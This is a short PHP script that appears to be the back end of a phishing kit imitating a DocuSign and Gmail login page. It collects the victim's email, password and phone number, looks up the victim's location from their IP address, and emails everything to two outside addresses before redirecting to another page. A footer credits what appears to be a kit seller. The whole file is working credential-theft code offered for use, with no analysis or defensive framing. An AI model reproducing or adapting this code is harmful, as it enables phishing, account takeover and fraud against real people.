<?php

session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];
$port = getenv("REMOTE_PORT");

$msg = "--------------< DocuSLGN - Gmall >-----------------------------\n";
$msg .= "DocuSLGN \n";
$msg .= "-----------------< DB Access >---------------------------\n";
$msg .= "Email: ".$_POST['aa_em']."\n";
$msg .= "Password: ".$_POST['aa_pss']."\n";
$msg .= "Phone #: ".$_POST['aa_phn']."\n";
$msg .= "-------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city' | 'Port : $port'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "-------------< 2018 blackshop.tools. >-----------------------------\n";


$to = "masseyjones1122@yahoo.com,asp987612345@outlook.com";
$subject = "DocuSLGN $country | $state";
$from = "From: DocuSLGN LLC<DocuSLGN>";

mail($to,$subject,$msg,$from);

  {
		   header("Location: mt.php");

	   }
?>